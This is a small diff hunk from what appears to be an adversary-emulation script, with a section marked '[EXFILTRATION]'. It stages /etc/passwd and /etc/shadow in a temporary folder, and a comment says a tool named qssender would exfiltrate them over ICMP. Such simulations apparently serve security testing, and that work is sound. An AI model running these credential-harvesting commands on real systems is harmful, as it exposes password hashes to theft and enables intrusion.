@@ -2,7 +2,6 @@
 # #[EXFILTRATION]
 
 #Simulate collected files
-mkdir /tmp/exfiltrate
 cat /etc/passwd > /tmp/exfiltrate/passwd
 cat /etc/shadow > /tmp/exfiltrate/shadow
 # Run qssender to exfilrate via ICMP
